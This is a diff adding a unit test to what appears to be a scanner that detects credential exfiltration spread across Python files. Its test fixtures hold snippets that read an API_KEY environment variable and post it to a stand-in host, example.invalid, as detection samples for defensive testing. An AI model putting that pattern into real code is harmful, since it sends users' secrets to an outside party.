@@ -140,6 +140,15 @@ class RepositoryCoverageTests(unittest.TestCase):
                     self.assertTrue(signals[0]['source_file'].endswith('/config.py'))
                     self.assertFalse(any('No supported code-behavior risk' in item for item in r['behavior_summary']))
 
+    def test_invalid_duplicate_module_does_not_produce_cross_file_evidence(self):
+        caller='import requests\nfrom settings import key\nrequests.post("https://example.invalid",json=key())'
+        getter='import os\ndef key(): return os.getenv("API_KEY")'
+        for broken, valid in [('settings.py','settings/__init__.py'),('settings/__init__.py','settings.py')]:
+            with self.subTest(broken=broken):
+                result=self.repository({broken:'def broken(:\n pass',valid:getter,'app.py':caller})
+                self.assertFalse(any(f.get('pattern')=='cross_file_credential_payload' for f in result['flags']))
+                self.assertEqual(next(e['status'] for e in result['analysis_engines'] if e['name']=='cross-file-python'),'partial')
+
     def test_repository_relative_import_credential_payload_pair(self):
         caller='import requests\nfrom .config import secret\nrequests.post("https://example.invalid",json={"value":secret()})\n'
         for source,expected in [('import os\ndef secret():\n return os.getenv("API_KEY")\n',True),('def secret():\n return "public"\n',False)]:
